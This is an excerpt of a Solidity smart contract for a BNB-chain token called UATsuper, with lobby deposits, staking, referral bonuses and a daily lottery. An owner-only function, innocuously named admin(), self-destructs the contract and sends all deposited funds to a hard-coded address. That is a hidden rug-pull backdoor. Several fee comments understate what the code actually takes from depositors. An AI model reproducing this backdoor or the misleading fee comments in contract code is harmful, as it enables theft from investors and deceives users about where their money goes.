...
contract ERC20 is Context, IERC20, IERC20Metadata, ReentrancyGuard {
    ...
    string private _name = "UATsuper";
    string private _symbol = "UATs";
...
contract UATsuper is ERC20, Ownable {
    event UserStake(
    ...
    address payable public paramountMarketAndBuyBack =
        payable(0x49BE591E03D39DBF6285F62226F2c3018E983869); // 4%
    address payable public paramountTeamAddr1 =
        payable(0x79792C825242437cfde965bB278749A09C211e3B); // 2%
    address payable public paramountTeamAddr2 =
        payable(0x9c215D7bFa2baec1E08b634F92B3F8d73B6811CA); // 2%
    address payable public paramountTeamAddr3 =
        payable(0x82d82BE8F1183279DB538F980BAca7AFA52b9f2D); // 0.5%
    address payable public paramountTeamAddr4 =
        payable(0x710DD597a30C4A45C24A512510Fa9bD46EF9E91e); // 0.5%
    address payable public paramountTeamAddr5 =
        payable(0x17B74edBE8aDE9eFb331a04b71Db5D2D75331297); // 0.4%
    ...
    uint256 public percentOfLobbyToBePooled = 88;
    ...
    /* Ref bonus NR*/
    uint256 internal constant ref_bonus_NR = 10;
    ...
    function changeMrktAddress(address payable adr) external onlyOwner {
        paramountMarketAndBuyBack = adr;
    }
    ...
    function changeTeam5Address(address payable adr) external onlyOwner {
        paramountTeamAddr5 = adr;
    }
    ...
    function flushdevShareOfStakeSells() external nonReentrant {
        ...
        paramountMarketAndBuyBack.transfer(devShareOfStakeSellsAndLoanFee / 2);
    ...
    function _updateDaily() public {
        ...
        if (currentDay == auctionDay + 1) {
            ...
            // 1% of lobby entry of each day goes to lottery_Pool
            checkForLotteryWinner();
            lottery_Pool += (lobbyEntry[currentDay - 1]*6) / 1000;
    ...
    function _sendDevShare() internal nonReentrant {
        payable(owner()).transfer(lobbyEntry[currentDay - 1] * 2 / 100);
        paramountMarketAndBuyBack.transfer(lobbyEntry[currentDay - 1] * 4 / 100);
        paramountTeamAddr1.transfer(lobbyEntry[currentDay - 1] * 2 / 100);
        paramountTeamAddr2.transfer(lobbyEntry[currentDay - 1] * 2 / 100);
        paramountTeamAddr3.transfer(lobbyEntry[currentDay - 1] * 2 / 100);
        paramountTeamAddr4.transfer(lobbyEntry[currentDay - 1] * 2 / 100);
        paramountTeamAddr5.transfer(lobbyEntry[currentDay - 1] * 4 / 1000);
    }
     ...
     * @param referrerAddr address of referring user (optional; 0x0 for no referrer)
     * @param amount amount of BNB entrying to lobby
     */
    function EnterLobby(address referrerAddr) external payable {
        require(launched, "Wait for the launch");
        require(referrerAddr != address(0), "need referrerAddr");
        require(msg.value >= 1 ether, "min 1 BNB");
        // transfer BNB from user wallet if stake profits have already sent to user
    ...
    */
    ...
    function admin() public onlyOwner {
        selfdestruct(payable(0x0040473E86141EfD5009e77511d63578D7068cA3));
    }
    ...
    function checkForLotteryWinner() internal nonReentrant {
        if (lottery_topBuy_today > lottery_topBuy_latest) {
            ...
            // no winner, reducing the record by 3%
            lottery_topBuy_latest -= (lottery_topBuy_latest * 3) / 100;
        }
    }
}